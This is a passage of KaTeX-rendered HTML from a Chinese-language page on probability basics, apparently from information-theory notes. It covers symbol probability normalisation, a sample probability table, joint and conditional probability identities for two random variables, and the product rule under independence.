class="mclose">)</span></span></span></span>，且 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>≤</mo><mi>P</mi><mo stretchy="false">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>≤</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0 \le P(a_i) \le 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> , <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∑</mo><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\sum{p\left( a_i \right)}=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>.</p><table><thead><tr><th>符号</th><th>出现概率</th></tr></thead><tbody><tr><td>A</td><td>0.2</td></tr><tr><td>B</td><td>0.3</td></tr><tr><td>C</td><td>0.5</td></tr></tbody></table><p>对于二维随机变量，也是有类似的结论，比较特殊一点的是，</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mo>=</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></munderover><mrow><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mi>p</mi></mrow><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mo>=</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mo>=</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mo>=</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mi mathvariant="normal">/</mi><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mo>=</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}&amp; \sum_{j=1}^m{p}\left( b_j/a_i \right) =1\\&amp;\sum_{j=1}^m{\sum_{i=1}^n{p}}\left( a_ib_j \right) =1\\&amp;\sum_{i=1}^n{p}\left( a_ib_j \right) =p\left( b_j \right)\\&amp;p\left( a_ib_j \right) =p\left( b_j \right) p\left( a_i/b_j \right) =p\left( a_i \right) p\left( b_j/a_i \right)\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:11.4594em;vertical-align:-5.4797em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:5.9797em;"><span style="top:-7.9797em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"></span></span><span style="top:-4.6145em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"></span></span><span style="top:-1.2494em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"></span></span><span style="top:1.1683em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:5.4797em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:5.9797em;"><span style="top:-7.9797em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span></span></span><span style="top:-4.6145em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span></span></span><span style="top:-1.2494em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:1.1683em;"><span class="pstrut" style="height:3.6514em;"></span><span class="mord"><span class="mord"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:5.4797em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>对于随机变量独立的情况，可以同时发生可以拆开成乘法，条件概率没有影响。</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mo>=</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mo>=</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mo separator="true">,</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mi mathvariant="normal">/</mi><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mo>=</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">p\left( a_ib_j \right) =p\left( a_i \right) p\left( b_j \right) ,p\left( b_j/a_i \right) =p\left( b_j \right) ,p\left( a_i/b_j \right) =p\left( a_i \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span 